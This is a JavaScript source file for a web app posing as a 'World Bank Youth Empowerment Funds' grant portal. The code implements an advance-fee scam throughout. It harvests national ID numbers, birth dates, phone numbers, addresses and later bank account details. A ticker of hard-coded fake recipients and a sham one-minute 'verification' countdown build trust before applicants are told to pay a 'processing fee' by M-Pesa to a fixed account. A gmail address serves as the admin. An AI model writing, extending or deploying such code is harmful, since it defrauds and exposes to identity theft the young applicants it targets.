// ============================================
// WBYEF - World Bank Youth Empowerment Funds
// Main Application JS - Supabase Backend
// ============================================

import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

const SUPABASE_URL = 'https://cjkyflsgdiqoyfiaveba.supabase.co';
const SUPABASE_KEY = 'sb_publishable_KB7yAs2hbZsYyYzHVz42lQ_e6oVvlC9';
const ADMIN_EMAIL  = 'worldbankfund@gmail.com';

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// ---- App State ----
let currentUser    = null;
let userProfile    = null;
let answers        = {};
let currentStep    = 0;
let selectedPlan   = null;
let allSubmissions = [];

// ---- Funding Plans ----
const PLANS = [
  { id: 1, amount: 'KSH 15,000', fee: 'KSH 499',  feeNum: 499  },
  { id: 2, amount: 'KSH 25,000', fee: 'KSH 599',  feeNum: 599  },
  { id: 3, amount: 'KSH 30,000', fee: 'KSH 699',  feeNum: 699  },
  { id: 4, amount: 'KSH 45,000', fee: 'KSH 799',  feeNum: 799  },
  { id: 5, amount: 'KSH 55,000', fee: 'KSH 899',  feeNum: 899  },
];

// ---- Question Steps ----
const STEPS = [
  {
    title: '👤 Personal Information',
    desc: 'Please provide your personal details accurately.',
    fields: [
      { id: 'fullName',    label: 'Full Name',                        type: 'text',   placeholder: 'e.g. John Kamau Mwangi' },
      { id: 'dob',         label: 'Date of Birth',                    type: 'date'  },
      { id: 'gender',      label: 'Gender',                           type: 'select', options: ['Male','Female','Prefer not to say'] },
      { id: 'nationality', label: 'Nationality',                      type: 'text',   placeholder: 'e.g. Kenyan' },
      { id: 'idNumber',    label: 'National ID / Passport Number',    type: 'text',   placeholder: 'e.g. 12345678' },
      { id: 'phone',       label: 'Phone Number',                     type: 'tel',    placeholder: 'e.g. 0712 345 678' },
      { id: 'email2',      label: 'Email Address',                    type: 'email',  placeholder: 'you@example.com' },
      { id: 'address',     label: 'Physical Address / Location',      type: 'text',   placeholder: 'e.g. Nairobi, Kenya' },
    ],
  },
  {
    title: '🎓 Educational Background',
    desc: 'Tell us about your academic qualifications.',
    fields: [
      { id: 'eduLevel',  label: 'Highest Level of Education Attained', type: 'select', options: ['Primary School','Secondary School','Certificate','Diploma','Bachelor\'s Degree','Master\'s Degree','PhD','Other'] },
      { id: 'school',    label: 'Name of Institution Attended',         type: 'text',   placeholder: 'e.g. University of Nairobi' },
      { id: 'course',    label: 'Field of Study / Course',              type: 'text',   placeholder: 'e.g. Business Administration' },
      { id: 'gradYear',  label: 'Year of Graduation (or Expected)',     type: 'text',   placeholder: 'e.g. 2022' },
    ],
  },
  {
    title: '🚀 Project & Business Information',
    desc: 'Tell us about the project or business idea you wish to fund.',
    fields: [
      { id: 'projectName', label: 'Project or Business Name',                                   type: 'text',     placeholder: 'e.g. GreenHarvest Farms' },
      { id: 'projectDesc', label: 'What does your project do? (Brief description)',             type: 'textarea', placeholder: 'Describe your project in a few sentences...' },
      { id: 'projectCat',  label: 'Which category does your project fall under?',               type: 'select',   options: ['Agriculture & Farming','Technology & Innovation','Community Development','Business & Entrepreneurship','Education & Skills','Environmental Projects','Other'] },
      { id: 'projectLoc',  label: 'Where will the project be based? (Location)',                type: 'text',     placeholder: 'e.g. Kisumu, Kenya' },
      { id: 'projectAge',  label: 'How long have you been working on this project?',            type: 'select',   options: ['Just starting out','Less than 6 months','6 months – 1 year','1 – 2 years','More than 2 years'] },
    ],
  },
  {
    title: '💰 Funding Details',
    desc: 'Help us understand how you plan to use the grant.',
    fields: [
      { id: 'fundAmount',  label: 'How much funding are you requesting? (KSH)',           type: 'text',     placeholder: 'e.g. 30,000' },
      { id: 'fundUsage',   label: 'How do you plan to use the funds? (Be specific)',      type: 'textarea', placeholder: 'e.g. Purchase farming equipment, pay for seeds...' },
      { id: 'fundOutcome', label: 'What is your expected outcome within the next 6 months?', type: 'textarea', placeholder: 'e.g. Increase production by 50% and hire 2 employees...' },
      { id: 'prevFunding', label: 'Have you received any funding or grant before?',       type: 'select',   options: ['No, this is my first time','Yes, I have received funding before'] },
    ],
  },
  {
    title: '✅ Application History',
    desc: '',
    type: 'radio',
    question: '🎯 Great! Is this your first time applying for our awards, dear applicant?',
    id: 'firstTime',
    options: [
      { value: 'yes', label: '✅ Yes, this is my first time applying' },
      { value: 'no',  label: '🔄 No, I have applied before' },
    ],
  },
  {
    title: '🎁 Fund Usage Preference',
    desc: '',
    type: 'radio',
    question: '💡 What would you like to do with the awarded funds? Please select the option that best fits your needs today.',
    id: 'fundPreference',
    options: [
      { value: 'school_fees', label: '🎓 School Fees — Invest in my education' },
      { value: 'bills',       label: '⚡ Bills — Settle my outstanding bills' },
      { value: 'rent',        label: '🏠 Rent — Secure my accommodation' },
      { value: 'food',        label: '🍽️ Food — Provide for myself and my family' },
      { value: 'business',    label: '📈 Business Deals — Grow my business or venture' },
      { value: 'other',       label: '⏭️ Other — Something else entirely' },
    ],
  },
];

// ============================================
// HELPERS — Button Loading State
// ============================================
function setLoading(btnId, textId, spinnerId, loading, label = '') {
  const btn     = document.getElementById(btnId);
  const textEl  = document.getElementById(textId);
  const spinner = document.getElementById(spinnerId);
  if (!btn) return;
  btn.disabled       = loading;
  spinner.style.display = loading ? 'inline-block' : 'none';
  if (label) textEl.textContent = label;
}

// ============================================
// PAGE NAVIGATION
// ============================================
function showPage(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(pageId).classList.add('active');
  window.scrollTo(0, 0);
}
window.showPage = showPage;

// ============================================
// AUTH — LOGIN
// ============================================
window.handleLogin = async function () {
  const email    = document.getElementById('login-email').value.trim();
  const password = document.getElementById('login-password').value;
  const errEl    = document.getElementById('login-error');
  errEl.textContent = '';

  if (!email || !password) { errEl.textContent = 'Please fill in all fields.'; return; }

  setLoading('login-btn', 'login-btn-text', 'login-spinner', true, 'Signing in...');

  const { data, error } = await supabase.auth.signInWithPassword({ email, password });

  setLoading('login-btn', 'login-btn-text', 'login-spinner', false, 'Sign In');

  if (error) { errEl.textContent = error.message; return; }

  currentUser = data.user;
  await afterLogin();
};

// ============================================
// AUTH — REGISTER
// ============================================
window.handleRegister = async function () {
  const name     = document.getElementById('reg-name').value.trim();
  const email    = document.getElementById('reg-email').value.trim();
  const password = document.getElementById('reg-password').value;
  const errEl    = document.getElementById('register-error');
  errEl.textContent = '';

  if (!name || !email || !password) { errEl.textContent = 'Please fill in all fields.'; return; }
  if (password.length < 6)          { errEl.textContent = 'Password must be at least 6 characters.'; return; }

  setLoading('register-btn', 'register-btn-text', 'register-spinner', true, 'Creating account...');

  const { data, error } = await supabase.auth.signUp({
    email, password,
    options: { data: { full_name: name } }
  });

  setLoading('register-btn', 'register-btn-text', 'register-spinner', false, 'Create Account');

  if (error) { errEl.textContent = error.message; return; }

  currentUser = data.user;
  await supabase.from('profiles').upsert({ id: currentUser.id, full_name: name, email, role: 'user' });
  await afterLogin();
};

// ============================================
// AUTH — FORGOT PASSWORD
// ============================================
window.handleForgotPassword = async function () {
  const email   = document.getElementById('forgot-email').value.trim();
  const errEl   = document.getElementById('forgot-error');
  const succEl  = document.getElementById('forgot-success');
  errEl.textContent = '';
  succEl.style.display = 'none';

  if (!email) { errEl.textContent = 'Please enter your email address.'; return; }

  setLoading('forgot-btn', 'forgot-btn-text', 'forgot-spinner', true, 'Sending...');

  const { error } = await supabase.auth.resetPasswordForEmail(email, {
    redirectTo: window.location.origin,
  });

  setLoading('forgot-btn', 'forgot-btn-text', 'forgot-spinner', false, 'Send Reset Link');

  if (error) { errEl.textContent = error.message; return; }

  succEl.style.display = 'block';
  succEl.textContent = `✅ Password reset link sent to ${email}. Please check your inbox (and spam folder).`;
};

// ============================================
// AUTH — LOGOUT
// ============================================
window.handleLogout = async function () {
  await supabase.auth.signOut();
  currentUser = null; userProfile = null; answers = {}; selectedPlan = null;
  showPage('page-login');
};

// ============================================
// AFTER LOGIN ROUTING
// ============================================
async function afterLogin() {
  const { data: profile } = await supabase
    .from('profiles').select('*').eq('id', currentUser.id).single();
  userProfile = profile;

  if (currentUser.email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) {
    await loadAdminDashboard();
    showPage('page-admin');
  } else {
    loadDashboard();
    const { data: sub } = await supabase
      .from('submissions').select('*')
      .eq('user_id', currentUser.id)
      .order('created_at', { ascending: false })
      .limit(1).single();

    if (sub) {
      if (sub.status === 'approved') showPage('page-approved');
      else showPage('page-waiting');
    } else {
      showPage('page-dashboard');
    }
  }
}

// ============================================
// TICKER
// ============================================
const FAKE_USERS = [
  { name: 'Amina Wanjiku',     phone: '0712 *** 321' },
  { name: 'Brian Otieno',      phone: '0723 *** 456' },
  { name: 'Cynthia Achieng',   phone: '0734 *** 789' },
  { name: 'David Kipchoge',    phone: '0745 *** 012' },
  { name: 'Esther Muthoni',    phone: '0756 *** 345' },
  { name: 'Felix Kamau',       phone: '0767 *** 678' },
  { name: 'Grace Nyambura',    phone: '0778 *** 901' },
  { name: 'Hassan Abdi',       phone: '0789 *** 234' },
  { name: 'Irene Chebet',      phone: '0700 *** 567' },
  { name: 'James Mutua',       phone: '0711 *** 890' },
  { name: 'Karen Auma',        phone: '0722 *** 123' },
  { name: 'Lilian Njeri',      phone: '0733 *** 456' },
  { name: 'Moses Kiprotich',   phone: '0744 *** 789' },
  { name: 'Nancy Adhiambo',    phone: '0755 *** 012' },
  { name: 'Oliver Omondi',     phone: '0766 *** 345' },
];

function loadTicker() {
  const content = document.getElementById('ticker-content');
  const doubled = [...FAKE_USERS, ...FAKE_USERS];
  content.innerHTML = doubled.map(u =>
    `<span class="ticker-item">✅ ${u.name} — ${u.phone} just received funding</span>`
  ).join('');
}

// ============================================
// DASHBOARD
// ============================================
function loadDashboard() {
  const firstName = (userProfile?.full_name || currentUser?.email || 'Friend').split(' ')[0];
  document.getElementById('user-first-name').textContent = firstName;
  loadTicker();
}

// ============================================
// QUESTIONS
// ============================================
window.startQuestions = function () {
  currentStep = 0;
  renderStep();
  showPage('page-questions');
};

function renderStep() {
  const step  = STEPS[currentStep];
  const total = STEPS.length;
  const pct   = Math.round(((currentStep + 1) / total) * 100);
  document.getElementById('progress-bar').style.width = pct + '%';
  document.getElementById('step-label').textContent   = `Step ${currentStep + 1} of ${total}`;

  const card = document.getElementById('question-card');

  if (step.type === 'radio') {
    card.innerHTML = `
      <h3>${step.title}</h3>
      <p class="section-desc">${step.question}</p>
      <div class="options-list">
        ${step.options.map(opt => `
          <label class="option-item ${answers[step.id] === opt.value ? 'selected' : ''}"
            onclick="selectOption('${step.id}', '${opt.value}', this)">
            <input type="radio" name="${step.id}" value="${opt.value}" ${answers[step.id] === opt.value ? 'checked' : ''}/>
            ${opt.label}
          </label>`).join('')}
      </div>
      <div class="q-nav">
        ${currentStep > 0 ? `<button class="btn-back" onclick="prevStep()">← Back</button>` : ''}
        <button class="btn-primary" onclick="nextStep()" style="flex:1">Continue →</button>
      </div>`;
  } else {
    card.innerHTML = `
      <h3>${step.title}</h3>
      <p class="section-desc">${step.desc}</p>
      ${step.fields.map(f => `
        <div class="form-group">
          <label>${f.label}</label>
          ${f.type === 'select'
            ? `<select id="q-${f.id}"><option value="">-- Select --</option>${f.options.map(o => `<option value="${o}" ${answers[f.id] === o ? 'selected' : ''}>${o}</option>`).join('')}</select>`
            : f.type === 'textarea'
            ? `<textarea id="q-${f.id}" placeholder="${f.placeholder || ''}">${answers[f.id] || ''}</textarea>`
            : `<input type="${f.type}" id="q-${f.id}" placeholder="${f.placeholder || ''}" value="${answers[f.id] || ''}"/>`
          }
        </div>`).join('')}
      <div class="q-nav">
        ${currentStep > 0 ? `<button class="btn-back" onclick="prevStep()">← Back</button>` : ''}
        <button class="btn-primary" onclick="nextStep()" style="flex:1">Continue →</button>
      </div>`;
  }
}

window.selectOption = function (fieldId, value, el) {
  answers[fieldId] = value;
  document.querySelectorAll('.option-item').forEach(o => o.classList.remove('selected'));
  el.classList.add('selected');
};

window.nextStep = function () {
  const step = STEPS[currentStep];
  if (step.type === 'radio') {
    if (!answers[step.id]) { alert('Please select an option to continue.'); return; }
  } else {
    for (const f of step.fields) {
      const el = document.getElementById('q-' + f.id);
      if (!el) continue;
      const val = el.value.trim();
      if (!val) { alert(`Please fill in: ${f.label}`); el.focus(); return; }
      answers[f.id] = val;
    }
  }
  if (currentStep < STEPS.length - 1) {
    currentStep++;
    renderStep();
    window.scrollTo(0, 0);
  } else {
    renderReview();
    showPage('page-review');
  }
};

window.prevStep = function () {
  if (currentStep > 0) { currentStep--; renderStep(); window.scrollTo(0, 0); }
};

// ============================================
// REVIEW
// ============================================
function renderReview() {
  const sections = [
    { title: '👤 Personal Information',   step: 0, fields: ['fullName','dob','gender','nationality','idNumber','phone','email2','address'] },
    { title: '🎓 Educational Background', step: 1, fields: ['eduLevel','school','course','gradYear'] },
    { title: '🚀 Project & Business',     step: 2, fields: ['projectName','projectDesc','projectCat','projectLoc','projectAge'] },
    { title: '💰 Funding Details',        step: 3, fields: ['fundAmount','fundUsage','fundOutcome','prevFunding'] },
    { title: '✅ First Time Applying',    step: 4, fields: ['firstTime'] },
    { title: '🎁 Fund Preference',        step: 5, fields: ['fundPreference'] },
  ];

  const labelMap = {};
  STEPS.forEach(s => {
    if (s.fields) s.fields.forEach(f => { labelMap[f.id] = f.label; });
    if (s.id)     labelMap[s.id] = s.title;
  });

  document.getElementById('review-content').innerHTML = sections.map(sec => `
    <div class="review-section">
      <div class="review-section-header">
        <strong>${sec.title}</strong>
        <button class="btn-edit" onclick="editStep(${sec.step})">✏️ Edit</button>
      </div>
      <div class="review-fields">
        ${sec.fields.map(fid => `
          <div class="review-field">
            <label>${labelMap[fid] || fid}</label>
            <span>${answers[fid] || '—'}</span>
          </div>`).join('')}
      </div>
    </div>`).join('');
}

window.editStep = function (step) {
  currentStep = step;
  renderStep();
  showPage('page-questions');
};

// ============================================
// SUBMIT → VERIFICATION (1 MINUTE)
// ============================================
window.submitApplication = function () {
  showPage('page-verify');
  // ⏱️ 1 minute = 60 seconds
  startCountdown(60, () => {
    renderPlans();
    showPage('page-plans');
  });
};

// ============================================
// COUNTDOWN TIMER
// ============================================
function startCountdown(seconds, onComplete) {
  const ring    = document.getElementById('countdown-ring');
  const textEl  = document.getElementById('countdown-text');
  const circum  = 2 * Math.PI * 45;
  let remaining = seconds;

  const interval = setInterval(() => {
    remaining--;
    const mins = Math.floor(remaining / 60);
    const secs = remaining % 60;
    textEl.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
    ring.style.strokeDashoffset = circum * (1 - remaining / seconds);

    if (remaining <= 0) {
      clearInterval(interval);
      onComplete();
    }
  }, 1000);
}

// ============================================
// FUNDING PLANS
// ============================================
function renderPlans() {
  document.getElementById('plans-grid').innerHTML = PLANS.map(p => `
    <div class="plan-item" id="plan-${p.id}" onclick="selectPlan(${p.id})">
      <div class="plan-amount">${p.amount}</div>
      <div class="plan-label">Grant Amount</div>
      <div class="plan-fee">${p.fee}</div>
      <div class="plan-fee-label">Processing Fee</div>
    </div>`).join('');
}

window.selectPlan = function (id) {
  selectedPlan = PLANS.find(p => p.id === id);
  document.querySelectorAll('.plan-item').forEach(el => el.classList.remove('selected'));
  document.getElementById('plan-' + id).classList.add('selected');
  document.getElementById('proceed-payment-btn').disabled = false;
};

window.proceedToPayment = function () {
  if (!selectedPlan) return;
  document.getElementById('payment-summary').innerHTML =
    `You selected: <strong>${selectedPlan.amount}</strong> grant &nbsp;|&nbsp; Processing Fee: <strong>${selectedPlan.fee}</strong>`;
  showPage('page-payment');
};

// ============================================
// PAYMENT METHOD TOGGLE
// ============================================
window.showPaymentMethod = function () {
  const method = document.getElementById('payment-method').value;
  document.getElementById('mpesa-steps').style.display      = method === 'mpesa' ? 'block' : 'none';
  document.getElementById('payment-placeholder').style.display = method && method !== 'mpesa' ? 'block' : 'none';
};

// ============================================
// COPY ACCOUNT NUMBER
// ============================================
window.copyAccountNumber = function () {
  const accNum = '0100445667500';
  navigator.clipboard.writeText(accNum).then(() => {
    const toast = document.getElementById('copy-toast');
    toast.style.display = 'block';
    setTimeout(() => { toast.style.display = 'none'; }, 3000);
  }).catch(() => {
    // Fallback for older browsers
    const el = document.createElement('textarea');
    el.value = accNum;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    const toast = document.getElementById('copy-toast');
    toast.style.display = 'block';
    setTimeout(() => { toast.style.display = 'none'; }, 3000);
  });
};

// ============================================
// SUBMIT PAYMENT
// ============================================
window.submitPayment = async function () {
  const method = document.getElementById('payment-method').value;
  const ref    = document.getElementById('payment-ref')?.value.trim();
  const errEl  = document.getElementById('payment-error');
  errEl.textContent = '';

  if (!method) { errEl.textContent = 'Please select a payment method.'; return; }
  if (method === 'mpesa' && !ref) { errEl.textContent = 'Please enter your M-Pesa transaction code.'; return; }

  const { error } = await supabase.from('submissions').insert({
    user_id:     currentUser.id,
    user_name:   answers.fullName || userProfile?.full_name || '',
    user_email:  currentUser.email,
    answers:     answers,
    plan_amount: selectedPlan?.amount || '',
    plan_fee:    selectedPlan?.fee || '',
    payment_ref: ref || 'Pending',
    status:      'pending',
  });

  if (error) { errEl.textContent = 'Submission failed: ' + error.message; return; }
  showPage('page-waiting');
};

// ============================================
// CHECK APPROVAL STATUS
// ============================================
window.checkApprovalStatus = async function () {
  const { data } = await supabase
    .from('submissions').select('status')
    .eq('user_id', currentUser.id)
    .order('created_at', { ascending: false })
    .limit(1).single();

  if (data?.status === 'approved') showPage('page-approved');
  else alert('Your application is still under review. Please check back soon.');
};

// ============================================
// ACCOUNT DETAILS (POST APPROVAL)
// ============================================
window.submitAccountDetails = async function () {
  const name   = document.getElementById('acc-name').value.trim();
  const number = document.getElementById('acc-number').value.trim();
  const bank   = document.getElementById('acc-bank').value.trim();
  const errEl  = document.getElementById('account-error');
  errEl.textContent = '';

  if (!name || !number) { errEl.textContent = 'Please fill in your name and account number.'; return; }

  const { error } = await supabase.from('account_details').insert({
    user_id:    currentUser.id,
    user_name:  name,
    acc_number: number,
    bank_name:  bank,
  });

  if (error) { errEl.textContent = 'Failed to save: ' + error.message; return; }

  document.getElementById('success-ref-id').textContent = 'WBYEF-' + Date.now();
  showPage('page-success');
};

// ============================================
// ADMIN DASHBOARD
// ============================================
async function loadAdminDashboard() {
  const { data } = await supabase
    .from('submissions').select('*').order('created_at', { ascending: false });
  allSubmissions = data || [];
  renderAdminStats();
  renderSubmissions(allSubmissions);
}

function renderAdminStats() {
  const total    = allSubmissions.length;
  const pending  = allSubmissions.filter(s => s.status === 'pending').length;
  const approved = allSubmissions.filter(s => s.status === 'approved').length;
  const rejected = allSubmissions.filter(s => s.status === 'rejected').length;

  document.getElementById('admin-stats').innerHTML = `
    <div class="admin-stat-card"><div class="stat-num">${total}</div><div class="stat-lbl">Total</div></div>
    <div class="admin-stat-card"><div class="stat-num" style="color:var(--pending)">${pending}</div><div class="stat-lbl">Pending</div></div>
    <div class="admin-stat-card"><div class="stat-num" style="color:var(--success)">${approved}</div><div class="stat-lbl">Approved</div></div>
    <div class="admin-stat-card"><div class="stat-num" style="color:var(--error)">${rejected}</div><div class="stat-lbl">Rejected</div></div>`;
}

function renderSubmissions(list) {
  const container = document.getElementById('admin-submissions');
  if (!list.length) {
    container.innerHTML = '<p style="color:var(--text-light);text-align:center;padding:40px">No submissions found.</p>';
    return;
  }
  container.innerHTML = list.map(s => `
    <div class="submission-card">
      <div>
        <div class="submission-name">${s.user_name || '—'}</div>
        <div class="submission-email">${s.user_email || '—'}</div>
        <div class="submission-plan">Grant: <strong>${s.plan_amount}</strong> &nbsp;|&nbsp; Fee: <strong>${s.plan_fee}</strong></div>
        <div class="submission-ref">Ref: ${s.payment_ref || '—'}</div>
        <div class="submission-date">${new Date(s.created_at).toLocaleString()}</div>
        <span class="status-badge ${s.status}">
          ${s.status === 'pending' ? '🔄 Pending' : s.status === 'approved' ? '✅ Approved' : '❌ Rejected'}
        </span>
      </div>
      <div class="submission-actions">
        ${s.status === 'pending' ? `
          <button class="btn-approve" onclick="updateStatus('${s.id}', 'approved')">✅ Approve</button>
          <button class="btn-reject"  onclick="updateStatus('${s.id}', 'rejected')">❌ Reject</button>
        ` : `<em style="font-size:0.8rem;color:var(--text-light)">${s.status}</em>`}
      </div>
    </div>`).join('');
}

window.updateStatus = async function (id, status) {
  const { error } = await supabase.from('submissions').update({ status }).eq('id', id);
  if (error) { alert('Update failed: ' + error.message); return; }
  await loadAdminDashboard();
};

window.filterSubmissions = function (filter, btn) {
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const filtered = filter === 'all' ? allSubmissions : allSubmissions.filter(s => s.status === filter);
  renderSubmissions(filtered);
};

// ============================================
// INIT — Check Session on Load
// ============================================
(async () => {
  const { data: { session } } = await supabase.auth.getSession();
  if (session) {
    currentUser = session.user;
    await afterLogin();
  } else {
    showPage('page-login');
  }
})();